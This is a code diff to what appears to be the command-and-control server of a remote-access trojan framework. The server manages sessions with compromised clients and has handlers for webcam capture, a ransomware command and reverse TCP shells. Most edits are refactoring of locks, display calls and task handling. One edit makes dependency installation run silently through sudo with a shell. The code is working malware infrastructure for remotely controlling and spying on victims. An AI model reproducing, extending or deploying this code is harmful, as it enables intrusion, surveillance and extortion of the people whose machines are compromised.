@@ -59,12 +59,13 @@ for __package in packages:
     try:
         exec("import {}".format(__package), globals())
     except ImportError:
-        util.debug("missing required package '{}'".format(__package))
-        missing.append(__package)
+        util.__logger__.debug("missing required package '{}'".format(__package))
+        missing.append(__package if __package != 'cv2' else 'opencv-python')
 
 # fix missing dependencies
 if missing:
-    proc = subprocess.Popen('{} -m pip install {}'.format(sys.executable, ' '.join(missing)), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
+    util.__logger__.info("installing missing packages: {}".format(', '.join(missing)))
+    proc = subprocess.Popen('sudo {} -m pip install {}'.format(sys.executable, ' '.join(missing)), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
     proc.wait()
     os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
 
@@ -116,6 +117,7 @@ class C2():
     incoming completed tasks from clients
     
     """
+
     _lock = threading.Lock()
     _text_color = 'RED'
     _text_style = 'DIM'
@@ -171,13 +173,13 @@ class C2():
             'tasks' : self.task_list}
 
     def _error(self, data):
-        lock = self.current_session.lock if self.current_session else self._lock
+        lock = self.current_session._lock if self.current_session else self._lock
         with lock:
             util.display('[-] ', color='red', style='dim', end=',')
             util.display('Server Error: {}\n'.format(data), color='reset', style='dim')
 
     def _print(self, info):
-        lock = self._lock if not self.current_session else self.current_session._lock
+        lock = self.current_session._lock if self.current_session else self._lock
         if isinstance(info, str):
             try:
                 info = json.loads(info)
@@ -186,7 +188,7 @@ class C2():
             max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
             max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
             key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
-            keys  = {k: key_len[k] for k in sorted(key_len.keys())}
+            keys = {k: key_len[k] for k in sorted(key_len.keys())}
             with lock:
                 for key in keys.values():
                     if info.get(key) and info.get(key) != 'None':
@@ -208,7 +210,7 @@ class C2():
         return s
 
     def _return(self, data=None):
-        lock, prompt = (self.current_session.lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
+        lock, prompt = (self.current_session._lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
         with lock:
             if data:
                 util.display('\n{}\n'.format(data))
@@ -288,7 +290,7 @@ class C2():
         globals()['__abort'] = True
         self._active.clear()
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
-        self.display('Exiting...')
+        util.display('Exiting...')
         sys.exit(0)
 
     def help(self, info=None):
@@ -327,7 +329,7 @@ class C2():
                 if len(info):
                     for data in info:
                         util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
-                        self.display(data)
+                        self._print(data)
             elif isinstance(info, str):
                 try:
                     self._print(json.loads(info))
@@ -419,20 +421,6 @@ class C2():
                         return
         util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
 
-    def task_handler(self):
-        """ 
-        Loop through active sessions, passing the tasks completed by 
-        each client to the database for tracking and/or storage
-
-        """
-        for session_id, session in self.sessions.items():
-            while True:
-                try:
-                    task = session.tasks.get_nowait()
-                    self.database.handle_task(task)
-                except Exception as e:
-                    break
-
     def task_list(self, id=None):
         """ 
         List client tasks and results
@@ -515,7 +503,7 @@ class C2():
             self.send("webcam %s" % args, session.id)
             task = self.recv(id=session.id)
             result = task.get('result')
-        self.display(result)
+        util.display(result)
 
     def session_remove(self, session):
         """ 
@@ -542,19 +530,19 @@ class C2():
             util.display(self._text_color + self._text_style)
             if not self.current_session:
                 with self._lock:
-                    util.display('Client {} disconnected'.format(session))
+                    util.display('Session {} disconnected'.format(session))
                 self._active.set()
                 session._active.clear()
                 return self.run()
             elif int(session) == self.current_session.session:
                 with self.current_session._lock:
-                    util.display('Client {} disconnected'.format(session))
+                    util.display('Session {} disconnected'.format(session))
                 self._active.clear()
                 self.current_session._active.set()
                 return self.current_session.run()
             else:
                 with self._lock:
-                    util.display('Client {} disconnected'.format(session))
+                    util.display('Session {} disconnected'.format(session))
                 self._active.clear()
                 self.current_session._active.set()
                 return self.current_session.run()
@@ -567,9 +555,12 @@ class C2():
         :param str verbose:   verbose output (default: False)
 
         """
-        lock = self._lock if not self.current_session else self.current_session._lock
+        lock = self.current_session._lock if self.current_session else self._lock
         with lock:
-            sessions = self.database.get_sessions(verbose=verbose, display=True)
+            sessions = self.database.get_sessions(verbose=verbose)
+            for session_id, session in enumerate(sessions):
+                util.display(str(session_id + 1), color=self._text_color, style=self._text_style)
+                self.database._display(session)
 
     def session_ransom(self, args=None):
         """ 
@@ -604,8 +595,7 @@ class C2():
             if self.current_session:
                 self.current_session._active.clear()
             self.current_session = self.sessions[int(session)]
-            util.display("\n\t[+] ", color='cyan', style='bright', end=',')
-            util.display("Client {} selected\n".format(self.current_session.id), color='reset', style='dim')
+            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(self.current_session.id), color='reset', style='dim')
             self.current_session._active.set()
             return self.current_session.run()
 
@@ -643,11 +633,7 @@ class C2():
             util.display("\t    Session:", color='reset', style='bright', end=',')
             util.display(str(self._count), color='reset', style='dim')
             util.display("\t    Started:", color='reset', style='bright', end=',')
-            util.display(time.ctime(session._created), color='reset', style='dim')
-            util.display("\t    Key:", color='reset', style='bright', end=',')
-            util.display(base64.b64encode(session.key), color='reset', style='dim')
-            util.display("\t    Info:", color='reset', style='bright')
-            self.display(session.info)
+            util.display(time.ctime(session._created) + "\n", color='reset', style='dim')
             prompt = self.current_session._prompt if self.current_session else self._prompt
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
             abort = globals()['__abort']
@@ -684,7 +670,7 @@ class C2():
                             output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                         except: pass
                     if output:
-                        self.display(str(output))
+                        util.display(str(output))
                 if globals()['__abort']:
                     break
             except KeyboardInterrupt:
@@ -714,10 +700,10 @@ class Session(threading.Thread):
         """
         super(Session, self).__init__()
         self._prompt = None
+        self._lock = threading.Lock()
         self._active = threading.Event()
         self._created = time.time()
         self.connection = connection
-        self.tasks = Queue.Queue()
         self.id = id
         self.key = security.diffiehellman(self.connection)
         self.info = self.client_info()
@@ -812,7 +798,7 @@ class Session(threading.Thread):
         while True:
             try:
                 if self._active.wait():
-                    task = globals()['c2'].recv_task() if not self._prompt else self._prompt
+                    task = self.recv_task() if not self._prompt else self._prompt
                     if 'help' in task.get('task'):
                         self._active.clear()
                         globals()['c2'].help(task.get('result'))
@@ -828,15 +814,15 @@ class Session(threading.Thread):
                             if result:
                                 task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                 globals()['c2'].display(result)
-                                self.tasks.put_nowait(task)
+                                globals()['c2'].database.handle_task(task)
                             continue
                         else:
                             task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
-                            globals()['c2'].send_task(task)
+                            self.send_task(task)
                     elif 'result' in task:
                         if task.get('result') and task.get('result') != 'None':
                             globals()['c2'].display(task.get('result'))
-                            self.tasks.put_nowait(task)
+                            globals()['c2'].database.handle_task(task)
                     else:
                         if self._abort:
                             break
